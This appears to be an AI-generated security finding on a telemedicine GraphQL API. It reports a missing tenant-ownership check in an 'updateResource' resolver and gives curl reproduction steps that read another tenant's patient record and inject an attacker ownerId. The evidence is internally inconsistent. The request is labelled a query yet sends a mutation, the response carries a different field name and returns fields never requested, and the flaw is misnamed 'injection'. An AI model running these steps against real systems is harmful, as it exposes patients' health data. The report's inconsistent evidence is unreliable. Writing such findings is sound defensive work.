# Security Analysis Report
**System:** TeleCare Consultation API (Telemedicine / Remote Care)
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** GQL-0236 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Injection / Pattern 5.2 | Resolver/graph traversal injection — attacker traverses resource graph to access cross-tenant telemedicine patient records |

---

## Finding 1 — Graph Traversal Injection: Cross-Tenant Patient Record Access (CRITICAL)

### Summary
The `updateResource` resolver on TeleCare Consultation API (`api.telecare-consultatio.example.com`) processes a mutation against `R-2236` without verifying the requesting tenant's ownership of the resource. Per §5.0 Pattern 5.2, this represents resolver/graph traversal injection: by crafting a mutation that traverses the resource graph to a connected object, the attacker injects through the resolver boundary and accesses patient data belonging to `tenant-64a5`. The attacker also attempts to inject a new `ownerId` (`attacker-ef0e64a5`) via the mutation input, attempting to take ownership of the traversed record.

**Pattern:** 5.2 — Resolver/graph traversal injection (Injection)
**Affected resolver:** `updateResource(id: ID!, input: ResourceInput!): Resource`
**Affected endpoint:** `POST https://api.telecare-consultatio.example.com/graphql`

### Evidence from HAR

**Request (attacker `tenant-ef0e`):**
```
POST https://api.telecare-consultatio.example.com/graphql HTTP/2.0
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-ef0e

{"query": "query VulnerableOp { updateResource(id: \"R-2236\", input: {status: \"approved\", ownerId: \"attacker-ef0e64a5\"}) { resourceId status } }"}
```

**Response (200 OK):**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-64a5",
      "ownerId": "other-user-ef0e64a5",
      "data": {
        "sensitiveField": "CONFIDENTIAL-ef0e64a5",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

**x-request-id:** `req-ef0e64a5`

The mutation traverses to `tenant-64a5`'s consultation record `R-2236`, returning patient data (`sensitiveField: CONFIDENTIAL-ef0e64a5`) and exposing it to the attacker. In telemedicine, resource records contain PHI: diagnoses, prescriptions, consultation notes — a HIPAA breach.

### Evidence Map

| Artifact Location | Field | Value | Significance |
|-------------------|-------|-------|--------------|
| §4.0 RISK-GQL-236 | Resolver gap | No `tenantId` ownership check | Root cause |
| §5.0 Pattern 5.2 | Vulnerability | Resolver/graph traversal injection | Classification |
| HAR request | `id` | `R-2236` | Victim patient record |
| HAR request | `input.ownerId` | `attacker-ef0e64a5` | Ownership injection attempt |
| HAR request | `x-tenant-id` | `tenant-ef0e` | Attacker tenant |
| HAR response | `tenantId` | `tenant-64a5` | Victim tenant — traversal confirmed |
| HAR response | `sensitiveField` | `CONFIDENTIAL-ef0e64a5` | Patient PHI exposed |
| HAR response | `ownerId` | `other-user-ef0e64a5` | Victim patient ownership |
| HAR headers | `x-request-id` | `req-ef0e64a5` | Correlation ID |

### Steps to Reproduce

**Step 1 — Obtain attacker JWT (tenant-ef0e):**
```bash
ATTACKER_JWT="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
```

**Step 2 — Graph traversal injection via updateResource (VULNERABLE):**
```bash
curl -s -X POST https://api.telecare-consultatio.example.com/graphql \
  -H "Authorization: Bearer $ATTACKER_JWT" \
  -H "x-tenant-id: tenant-ef0e" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateResource(id: \"R-2236\", input: {status: \"approved\", ownerId: \"attacker-ef0e64a5\"}) { resourceId tenantId data { sensitiveField internalNotes } } }"}' \
  | jq '.data.updateResource'
# Expected VULNERABLE output: tenantId=tenant-64a5, sensitiveField=CONFIDENTIAL-ef0e64a5
```

**Step 3 — Secure baseline (expected after fix):**
```bash
# Returns: {"errors":[{"message":"Forbidden: resource does not belong to your tenant"}]}
```

### Remediation

1. **Pre-mutation ownership check:** Fetch resource, verify `resource.tenantId === context.auth.tenantId`; reject with FORBIDDEN on mismatch.
2. **Strip `ownerId` from mutation input:** Server sets `ownerId` from JWT `sub`; never accept from client.
3. **Graph traversal protection:** When resolvers return nested objects (children/related resources), each child resolver must independently enforce tenancy ownership.
4. **HIPAA compliance:** Telemedicine consultation data is PHI — unauthorized access triggers HIPAA breach notification requirements. Implement audit log for all consultation record mutations.
5. **Fix Redis cache key:** Include `tenantId` (§2.0 gap).
